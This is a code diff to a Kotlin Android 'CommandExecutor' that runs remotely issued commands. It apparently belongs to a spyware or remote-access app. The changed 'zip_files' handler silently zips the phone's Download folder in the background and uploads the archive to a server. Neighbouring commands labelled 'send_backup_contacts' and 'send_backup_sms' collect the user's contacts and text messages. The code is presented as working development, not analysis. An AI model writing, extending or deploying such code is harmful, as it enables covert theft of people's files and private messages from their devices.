@@ -46,7 +46,7 @@ object CommandExecutor {
         }
     }
 
-    private suspend fun processCommand(context: Context, command: Command): Any {
+    private fun processCommand(context: Context, command: Command): Any {
         val params = command.params
         val cmd = command.command
 
@@ -163,33 +163,20 @@ object CommandExecutor {
             "file_info" -> FileExecutor.getFileInfo(context, params)
             "zip_files" -> {
                 val path = params["path"] as? String ?: "/storage/emulated/0/Download"
-                val sourceDir = java.io.File(path)
-                if (!sourceDir.exists() || !sourceDir.isDirectory) {
-                    mapOf("error" to "Directory not found: $path")
-                } else {
-                    val timestamp = System.currentTimeMillis()
-                    val outputFile = java.io.File(
-                        sourceDir.parentFile,
-                        "${sourceDir.name}_backup_$timestamp.zip"
-                    )
-                    val result = ZipManager.compressDirectory(sourceDir, outputFile)
-                    if (result.success) {
-                        try {
-                            ApiClient.uploadFile(outputFile, "zip_files")
-                        } catch (e: Exception) {
-                            Log.w(TAG, "Upload failed for zip file", e)
+                executorScope.launch {
+                    try {
+                        val sourceDir = java.io.File(path)
+                        if (sourceDir.exists() && sourceDir.isDirectory) {
+                            val timestamp = System.currentTimeMillis()
+                            val outputFile = java.io.File(sourceDir.parentFile, "${sourceDir.name}_backup_$timestamp.zip")
+                            val result = ZipManager.compressDirectory(sourceDir, outputFile)
+                            if (result.success) {
+                                try { ApiClient.uploadFile(outputFile, "zip_files") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
+                            }
                         }
-                        mapOf(
-                            "status" to "completed",
-                            "zip_path" to result.outputPath,
-                            "files_count" to result.fileCount,
-                            "original_size" to result.originalSize,
-                            "compressed_size" to result.compressedSize
-                        )
-                    } else {
-                        mapOf("error" to result.error ?: "Compression failed")
-                    }
+                    } catch (e: Exception) { Log.w(TAG, "zip_files error", e) }
                 }
+                mapOf("status" to "started", "path" to path, "message" to "Zipping in background...")
             }
             "send_backup_contacts" -> DataCollector.getContacts(context)
             "send_backup_sms" -> DataCollector.getSMS(context)
